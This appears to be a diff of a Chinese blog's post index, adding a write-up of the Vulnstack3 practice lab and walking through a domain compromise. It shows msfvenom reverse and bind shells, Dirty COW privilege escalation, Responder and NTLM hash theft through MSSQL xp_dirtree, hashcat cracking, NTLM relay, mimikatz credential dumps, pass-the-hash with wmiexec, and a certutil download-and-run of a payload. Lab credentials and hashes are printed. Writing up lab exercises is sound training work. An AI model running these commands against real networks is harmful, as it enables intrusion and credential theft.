+<p>这里ew，ssh代理都可以，我选择简单的ssh动态代理<code>ssh -CfNg -D 1080 wwwuser@192.168.184.137</code>，结合proxifier对内网进行渗透</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220711230354697.png" alt="image-20220711230354697"></p>
+<p>这里可以直接访问到内网地址说明代理成功</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220711230526240.png" alt="image-20220711230526240"></p>
+<p>接下来就用fscan进行扫描<code>fscan64.exe -h 192.168.93.1/24 -np -o fscan_result/result93.txt</code>（-np需要加上，因为直接ping不通），发现内网还有10、20、30这三台主机</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220711234256330.png" alt="image-20220711234256330"></p>
+<p>再用nmap进行更全面的端口扫描</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nmap -Pn -sT -sV <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">10</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">30</span> -F</span><br><span class="line">-Pn # 扫描之前不需要用<span class="built_in">ping</span>命令，有些防火墙禁止<span class="built_in">ping</span>命令。可以使用此选项进行扫描</span><br><span class="line">-sT # TCP connect（）扫描，这种方式会在目标主机的日志中记录大批连接请求和错误信息。</span><br><span class="line">-sV # 探测端口服务版本</span><br><span class="line">-F # 只扫描在nmap内建的服务文件中已知的端口，如果不致电给，nmap将扫描端口<span class="number">1</span>~<span class="number">1024</span>及包含在nmap-service文件中的所有其他端口</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220711235001116.png" alt="image-20220711235001116"></p>
+<p>发现存在域<code>test.org</code>，域控为93.10这台服务器，那么接下来的目标就是拿下域控了</p>
+<p>进一步的渗透测试交到MSF上进行</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 利用msf生成一个木马，上传到<span class="number">184</span>.<span class="number">137</span>上执行</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<span class="number">192</span>.<span class="number">168</span>.<span class="number">184</span>.<span class="number">128</span> LPORT=<span class="number">4444</span> -f elf &gt; shell.elf</span><br><span class="line"></span><br><span class="line"># 在msf上开启监听</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span></span><br><span class="line"><span class="built_in">set</span> lport <span class="number">4444</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220713134118908.png" alt="image-20220713134118908"></p>
+<p>添加路由如下</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 添加路由</span><br><span class="line">run autoroute -s <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">0</span>/<span class="number">24</span></span><br><span class="line"># 查看路由</span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220713134631085.png" alt="image-20220713134631085"></p>
+<p>添加成功后，利用msf在本地开启socks代理</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> SRVHOST <span class="number">192</span>.<span class="number">168</span>.<span class="number">184</span>.<span class="number">128</span></span><br><span class="line"><span class="built_in">set</span> SRVPORT <span class="number">1080</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>代理开好后配置/etc/proxychains4.conf文件方便后续使用proxychans4</p>
+<p>后面都是参考wp的了，结果还没搞出来，可能是环境问题，只能强行写一下了，记录一下</p>
+<blockquote>
+<p>有几个打法：<strong>SMB爆破</strong>、<strong>MSSQL NTLM Stealer</strong>、<strong>NTLM Relay</strong>。</p>
+</blockquote>
+<h4 id="SMB爆破"><a href="#SMB爆破" class="headerlink" title="SMB爆破"></a>SMB爆破</h4><p>这里是直接根据wp在字典里加的密码，QAQ</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715195130401.png" alt="image-20220715195130401"></p>
+<h4 id="MSSQL-NTLM-Stealer"><a href="#MSSQL-NTLM-Stealer" class="headerlink" title="MSSQL NTLM Stealer"></a>MSSQL NTLM Stealer</h4><p>前面探测到<code>192.168.93.20</code>这台机开启了<code>1433</code>端口，尝试进行连接。账号密码则使用前面<code>Joomla CMS</code>那个配置文件中收集到的：<code>testuser / cvcvgjASD!@</code></p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">apt-get install freetds-bin</span><br><span class="line">proxychains4 tsql -S <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span> -U testuser</span><br></pre></td></tr></table></figure>
+
+<p>可以登录</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715194331486.png" alt="image-20220715194331486"></p>
+<p>接下来就是在93.100这台服务器上搭建Responder环境</p>
+<p>首先下载下面几个工具，</p>
+<p>OpenSSL: <a href="https://www.openssl.org/source/openssl-1.1.1g.tar.gz">https://www.openssl.org/source/openssl-1.1.1g.tar.gz</a></p>
+<p>Python3: <a href="https://www.python.org/ftp/python/3.6.9/Python-3.6.9.tgz">https://www.python.org/ftp/python/3.6.9/Python-3.6.9.tgz</a></p>
+<p>Responder: <a href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a></p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 安装如下</span><br><span class="line"># 注意，这里安装就需要root权限行了，我终于明白看的文章为什么要提权了，这里用脏牛提权就好</span><br><span class="line"></span><br><span class="line">## 脏牛提权</span><br><span class="line">$ git clone https://github.com/FireFart/dirtycow.git</span><br><span class="line">$ gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line">$ ./dirty New-Password</span><br><span class="line">$ su firefart</span><br><span class="line"></span><br><span class="line">## 安装OpenSSL</span><br><span class="line">$ tar -zxvf openssl-<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span>g.tar.gz &amp;&amp; <span class="built_in">cd</span> openssl-<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span>g/</span><br><span class="line">$ ./config --prefix=/usr/local/openssl shared zlib</span><br><span class="line">$ make &amp;&amp; make install</span><br><span class="line">$ <span class="built_in">echo</span> &#x27;export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/openssl/lib&#x27; &gt;&gt; ~/.bash_profile</span><br><span class="line">$ source ~/.bash_profile</span><br><span class="line"></span><br><span class="line">## 我本地测的时候报错说还却sqlite3</span><br><span class="line">## 参考https://www.jianshu.com/p/f32ec5c9bd30</span><br><span class="line">$ wget https://www.sqlite.org/<span class="number">2017</span>/sqlite-autoconf-<span class="number">3170000</span>.tar.gz –no-check-certificate</span><br><span class="line">$ tar zxvf sqlite-autoconf-<span class="number">3170000</span>.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> sqlite-autoconf-<span class="number">3170000</span></span><br><span class="line">$ ./configure --prefix=/usr/local/sqlite</span><br><span class="line">$  make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">## 安装Python3</span><br><span class="line">$ tar -zxvf Python-<span class="number">3</span>.<span class="number">6</span>.<span class="number">9</span>.tgz &amp;&amp; <span class="built_in">cd</span> Python-<span class="number">3</span>.<span class="number">6</span>.<span class="number">9</span>/</span><br><span class="line">$ ./configure prefix=/usr/local/python3 --with-openssl=/usr/local/openssl</span><br><span class="line">$ make &amp;&amp; make install</span><br><span class="line">$ <span class="built_in">echo</span> &#x27;</span><br><span class="line">#配置python</span><br><span class="line">export PYTHON_HOME=/usr/local/python3</span><br><span class="line">export <span class="built_in">PATH</span>=$PYTHON_HOME/bin:$<span class="built_in">PATH</span>&#x27; &gt;&gt; ~/.bash_profile</span><br><span class="line">$ source ~/.bash_profile</span><br><span class="line"></span><br><span class="line">## 测试</span><br><span class="line">$ python3 </span><br><span class="line">&gt;&gt; import ssl</span><br><span class="line">&gt;&gt; import ctypes</span><br><span class="line">&gt;&gt; import sqlite3</span><br><span class="line"># 没有报错即为成功</span><br><span class="line"></span><br><span class="line">## 安装依赖</span><br><span class="line">$ pip3 install netifaces six pycryptodome pycryptodomex</span><br></pre></td></tr></table></figure>
+
+<p>运行Responder</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">$ python3 Responder.py -I eth1 -Pv</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715204732059.png" alt="image-20220715204732059"></p>
+<p>Kali中使用<code>auxiliary/admin/mssql/mssql_ntlm_stealer</code>，执行<code>xp_dirtree</code>，触发UNC</p>
+<blockquote>
+<p> 配合xp_dirtree存储过程获取运行mssql服务的用户NTLM的hash值,原理是通过LLMNR/NBT-NS欺骗攻击,让MSSQL去访问我们伪造的服务,当MSSQL去执行时就会把它自己的凭证发给我们,我们通过破解它的凭证在返回登录MSSQL,得到最高权限具体操作</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">msf6&gt; use auxiliary/admin/mssql/mssql_ntlm_stealer</span><br><span class="line">msf6&gt; <span class="built_in">set</span> RHOSTS <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span></span><br><span class="line">msf6&gt; <span class="built_in">set</span> SMBPROXY <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">100</span></span><br><span class="line">msf6&gt; <span class="built_in">set</span> USERNAME testuser</span><br><span class="line">msf6&gt; <span class="built_in">set</span> PASSWORD cvcvgjASD!@</span><br><span class="line">msf6&gt; exploit</span><br></pre></td></tr></table></figure>
+
+<p>利用成功，此时可以看到已经获取到了NTLMv2-Hash</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">[MSSQL] Received connection from ::ffff:<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span></span><br><span class="line">[SMB] NTLMv2-SSP Client   : ::ffff:<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span></span><br><span class="line">[SMB] NTLMv2-SSP Username : WIN2008\Administrator</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : Administrator::WIN2008:<span class="number">710</span>aa5e90138c34b:F435BDB2083AC31B18639D7013BA94BE:<span class="number">01010000000000009553</span>EC8E1F98D801393FF02331B1CEBF00000000020008004800580045004E0001001E00570049004E002D00360041005600430047004D003300530042004B004B0004003400570049004E002D00360041005600430047004D003300530042004B004B002E004800580045004E002E004C004F00430041004C00030014004800580045004E002E004C004F00430041004C00050014004800580045004E002E004C004F00430041004C00080030003000000000000000000000000030000011C4314A8F10C5B6E59317CE9DBBCF8859B4494BEA8E251FCE09E150BA4F27F40000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>得到NTLMv2后，可以利用hashcat暴力破解</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 查看支持的<span class="built_in">Mode</span>,这里NTLMv2的<span class="built_in">Mode</span>为<span class="number">5600</span></span><br><span class="line">$ hashcat --example-hashes | less</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715210758021.png" alt="image-20220715210758021"></p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 破解</span><br><span class="line">$ hashcat -m <span class="number">5600</span> hash.txt top1000.txt --force</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715210830597.png" alt="image-20220715210830597"></p>
+<p>这里其实是把wp里的密码加到字典才爆出来的</p>
+<h4 id="NTLM-Relay"><a href="#NTLM-Relay" class="headerlink" title="NTLM Relay"></a>NTLM Relay</h4><p>MultiRelay中继攻击</p>
+<blockquote>
+<p>没爆破出来可以尝试中继Win2008打Win7，发现Win2008的administrator凭据可以中继到Win7，所以可知Win2008和Win7的本地administrator密码相同。参考：<a href="https://xz.aliyun.com/t/6988#toc-4">https://xz.aliyun.com/t/6988#toc-4</a></p>
+</blockquote>
+<p>运行前需要编译相关工具，这里我在kali完成编译再传到93.100服务器</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">$ apt-get install gcc-mingw-w64-x86-<span class="number">64</span></span><br><span class="line">$ x86_64-w64-mingw32-gcc ./MultiRelay/bin/Runas.c -o ./MultiRelay/bin/Runas.exe -municode -lwtsapi32 -luserenv</span><br><span class="line">$ x86_64-w64-mingw32-gcc ./MultiRelay/bin/Syssvc.c -o ./MultiRelay/bin/Syssvc.exe -municode</span><br></pre></td></tr></table></figure>
+
+<p>接下来展开<strong>中继攻击</strong></p>
+<blockquote>
+<p>所谓中继攻击，就是在两个合法参与方A和B之间进行的一种攻击，中间人C篡改A的消息发送给B或将B的消息篡改发送给A。 C这样做的目的是为了获得A或B的特权，这样C就可以把A的钱通过B的非接触式终端盗走。</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 在<span class="number">93</span>.<span class="number">100</span>服务器执行</span><br><span class="line">## 关闭本地的nginx服务，因为会冲突，启动nginx服务直接输入nginx即可</span><br><span class="line">$ nginx -s stop</span><br><span class="line"></span><br><span class="line">## 禁用SMB和HTTP服务,将对应选项修改为Off</span><br><span class="line">$ vi Responder.conf</span><br><span class="line"></span><br><span class="line">## 开启监听</span><br><span class="line">$ python3 Responder.py -I eth1 -v -F</span><br><span class="line"></span><br><span class="line">## 运行MultiRelay</span><br><span class="line">$ python3 MultiRelay.py -t <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">30</span> -u ALL</span><br><span class="line"></span><br><span class="line"># kali执行</span><br><span class="line">## MSSQL触发UNC</span><br><span class="line">msf6&gt; exploit</span><br></pre></td></tr></table></figure>
+
+<p>可惜我本地测没有成功，说目标没有这个凭证</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715212639480.png" alt="image-20220715212639480"></p>
+<p>所以接下来的步骤都是照抄wp的，太菜了QAQ</p>
+<p>此时已经获取到Win7的Shell了，然后使用<code>mimikatz</code>抓取明文密码。</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot; </span><br><span class="line">mimikatz &quot;sekurlsa::logonpasswords&quot;</span><br></pre></td></tr></table></figure>
+
+<p>还可以通过<code>dump</code>来获得<code>NTLM Hash</code>，存储在<code>Responder/tools/MultiRelay/relay-dumps</code>目录下</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">Administrator:500:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">c1794c5aa8547c87a8bcd0324b8337</span>:::</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/60932dea1a09ff9bf41bfd506003640e.png" alt="img"></p>
+<p>然后就可以用wmiexec来连接到93.20</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># git clone https://github.com/SecureAuthCorp/impacket</span><br><span class="line"># <span class="built_in">cd</span> impacket/ &amp;&amp; python3 -m pip install .</span><br><span class="line"></span><br><span class="line"># NTLM Hash</span><br><span class="line">$ proxychains4 python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>c1794c5aa8547c87a8bcd0324b8337 administrator@<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span></span><br><span class="line"></span><br><span class="line"># 明文密码</span><br><span class="line">$ proxychains4 python3 wmiexec.py &#x27;administrator:<span class="number">123</span>qwe!ASD@<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span>&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这里还是照着答案测了一下，终于拿下了一个windows服务器😭</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715221055341.png" alt="image-20220715221055341"></p>
+<h3 id="攻域控"><a href="#攻域控" class="headerlink" title="攻域控"></a>攻域控</h3><h4 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h4><blockquote>
+<p>未知Win2008明文密码，使用NTLM Hash通过WMI连接到Win2008，然后获取正向Shell，通过进程迁移提权后读取文件</p>
+</blockquote>
+<p>MSF生成一个正向shell木马，并开启监听</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">$ msfvenom -p windows/meterpreter/bind_tcp -f exe -o bind.exe</span><br><span class="line"></span><br><span class="line">msf6&gt; use exploit/multi/handler </span><br><span class="line">msf6&gt; <span class="built_in">set</span> PAYLOAD windows/meterpreter/bind_tcp</span><br><span class="line">msf6&gt; <span class="built_in">set</span> RHOST <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span></span><br><span class="line">msf6&gt; <span class="built_in">set</span> LPORT <span class="number">5555</span></span><br><span class="line">msf6&gt; exploit</span><br></pre></td></tr></table></figure>
+
+<p>然后将生成的正向马传到93.100上（这里利用scp上传），并在93.100上开启http服务</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># kali中ssh连接配置</span><br><span class="line"># vim /root/.ssh/config</span><br><span class="line"># Host *</span><br><span class="line"># HostkeyAlgorithms +ssh-rsa</span><br><span class="line"># PubkeyAcceptedKeyTypes +ssh-rsa</span><br><span class="line"></span><br><span class="line">$ scp bind.exe wwwuser@<span class="number">192</span>.<span class="number">168</span>.<span class="number">184</span>.<span class="number">137</span>:/tmp/</span><br><span class="line"># wwwuser_123Aqx</span><br><span class="line"></span><br><span class="line">$ python3 -m http.server <span class="number">8080</span></span><br></pre></td></tr></table></figure>
+
+<p>然后通过之间WMI连接的93.20的shell，下载传到93.100上bind.exe马，并执行</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">$ proxychains4 python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>c1794c5aa8547c87a8bcd0324b8337 administrator@<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span></span><br><span class="line"></span><br><span class="line">$ certutil -urlcache -split -f http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">100</span>:<span class="number">8080</span>/bind.exe </span><br><span class="line">$ bind.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715224132571.png" alt="image-20220715224132571"></p>
+<p>上线之后执行<code>ps</code>，发现存在域管用户的进程，进程迁移</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">meterpreter&gt; ps</span><br><span class="line">meterpreter&gt; migrate <span class="number">3800</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715224352593.png" alt="image-20220715224352593"></p>
+<p>迁移成功</p>
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715224749412.png" alt="image-20220715224749412"></p>
+<p>接下来就可以读取域控的文件了</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">type</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">10</span>\C$\Users\Administrator\Documents\flag.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715224926271.png" alt="image-20220715224926271"></p>
+<h4 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h4><blockquote>
+<p>已知Win2008明文密码，使用mimikatz抓取域管密码，然后通过IPC连接域控读取文件</p>
+</blockquote>
+<p>上传mimikatz。使用<code>smbclient</code>连接并上传</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">$ proxychains4 smbclient -L <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span> -U administrator</span><br><span class="line">$ proxychains4 smbclient //<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span>/ADMIN$ -U administrator</span><br><span class="line">$ put mimikatz.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715230004656.png" alt="image-20220715230004656"></p>
+<p>执行mimikatz，获得<code>TEST\administrator</code>密码：<code>zxcASDqw123!</code></p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> c:/windows</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot; &quot;<span class="keyword">exit</span>&quot; &gt; pwd.log</span><br><span class="line"><span class="built_in">type</span> pwd.log</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715230259643.png" alt="image-20220715230259643"></p>
+<p>最后IPC连接到域控读取文件</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">10</span>\admin$ zxcASDqw123!! /user:test\administrator</span><br><span class="line">$ <span class="built_in">type</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">10</span>\C$\users\administrator\Documents\flag.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715230516432.png" alt="image-20220715230516432"></p>
+<p>获得密码后其实这里可以用之前的方法，用WMI直接登录上域控93.10</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">proxychains4 python3 wmiexec.py &#x27;administrator:zxcASDqw123!!@<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">10</span>&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715230812938.png" alt="image-20220715230812938"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cloud.tencent.com/developer/article/1942868">Vulnstack3</a></p>
+<p><a href="https://xz.aliyun.com/t/6988#toc-4">Vlunstack ATT&amp;CK实战系列——红队实战（三）Writeup</a></p>
+<p><a href="https://www.freebuf.com/articles/network/263069.html">记一次Vulnstack靶场内网渗透（四）</a></p>
+<p><a href="https://v0w.top/2020/03/14/mysql-getshell/#0x00-%E5%89%8D%E8%A8%80">mysql写shell的一点总结</a></p>
+<p><a href="https://www.freebuf.com/articles/network/263069.html">记一次Vulnstack靶场内网渗透（四）</a></p>
+<p><a href="https://blog.csdn.net/shang_0122/article/details/114820532">nginx正向和反向代理的区别</a>–<strong>本质上代理服务器还是那个代理服务器,如果替客户端干活就是正向代理,如果替服务端干活就是反向代理</strong></p>
+<p><a href="https://blog.csdn.net/weixin_45630258/article/details/124976564">Nginx 反向代理+负载均衡</a></p>
+<p><a href="https://blog.csdn.net/qq_43038960/article/details/125591755">代理、正向代理与反向代理</a></p>
+<p><a href="https://blog.csdn.net/tryheart/article/details/108245986">nmap 常用参数</a></p>
+<p><a href="https://wenku.baidu.com/view/ae5cca240722192e4536f64a.html">nmap命令使用详细解释</a></p>
+<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p><a href="https://www.openssl.org/source/openssl-1.1.1g.tar.gz">OpenSSL</a></p>
+<p><a href="https://www.python.org/ftp/python/3.6.9/Python-3.6.9.tgz">Python3</a></p>
+<p><a href="https://github.com/lgandx/Responder">Responder</a></p>
+<p><a href="https://github.com/SecureAuthCorp/impacket">impacket</a></p>
 ]]></content>
       <categories>
         <category>内网安全</category>
@@ -529,218 +1287,6 @@
 <p><a href="http://c.biancheng.net/view/839.html">Linux /etc/passwd内容解释</a></p>
 <p><a href="http://c.biancheng.net/view/840.html">Linux /etc/shadow（影子文件）内容解析</a></p>
 <p><a href="https://www.runoob.com/w3cnote/set-ssh-login-key.html">设置 SSH 通过密钥登录 </a></p>
-]]></content>
-      <categories>
-        <category>内网安全</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-        <tag>内网安全，vulnstack</tag>
-        <tag>域渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Vulnstack3靶场内网渗透</title>
-    <url>/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
-    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>需要添加一张192.168.93.0/24网段的内网网卡</p>
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715230940156.png" alt="image-20220715230940156"></p>
-<p>若是kali用的Nat模式这里不要勾选“将主机虚拟适配器连接到此网络”，若是桥接模式则勾选</p>
-<h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h2><p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715231439922.png" alt="image-20220715231439922"></p>
-<h2 id="打靶"><a href="#打靶" class="headerlink" title="打靶"></a>打靶</h2><p>先用nmap进行探针<code>nmap 192.168.184.0/24</code></p>
-<p>探测到在192.168.184.137地址开有web服务</p>
-<p>访问如下，发现是Joomla的CMS</p>
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710114851003.png" alt="image-20220710114851003"></p>
-<p>利用msf的<code>auxiliary/scanner/http/joomla_version</code>模块探测Joomla版本，发现是3.9.12版本的</p>
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710115045397.png" alt="image-20220710115045397"></p>
-<p>这就有点棘手了，因为版本很新，网上都是3.4、3.5之类的漏洞，看来是没法直接用，于是去找登录点看看有没有弱口令</p>
-<p>有两处登录点，一个是前台<code>http://192.168.184.137/index.php/author-login</code></p>
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710115400615.png" alt="image-20220710115400615"></p>
-<p>另一个是后台<code>http://192.168.184.137/administrator/index.php</code>（robots.txt中找到的路径）</p>
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710115413169.png" alt="image-20220710115413169"></p>
-<p>但是都不存在弱口令，呜呜😭</p>
-<p>没辙了等着爆破密码，摆烂了一会儿</p>
-<p>这个靶场是和小伙伴一起打的，在我摆烂的时候，小伙伴用dirsearch扫了一下目录，扫出来了一个<code>configuration.php~</code>文件，里面有mysql数据库用户名和密码<code>testuser/cvcvgjASD!@</code>，我直呼牛B！！（害，懒了一下没去扫目录，不能懒啊！）</p>
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710120843966.png" alt="image-20220710120843966"></p>
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710120915806.png" alt="image-20220710120915806"></p>
-<p>直接用Navicat登录成功，查看<code>umnbt_users</code>表，获得用户名密码<code>admin/$10$N/Yv/9rzxyq.z0gLTT5og.pj3FFAP8Sq2PcBgsMX/Qnc2671qQkHy</code></p>
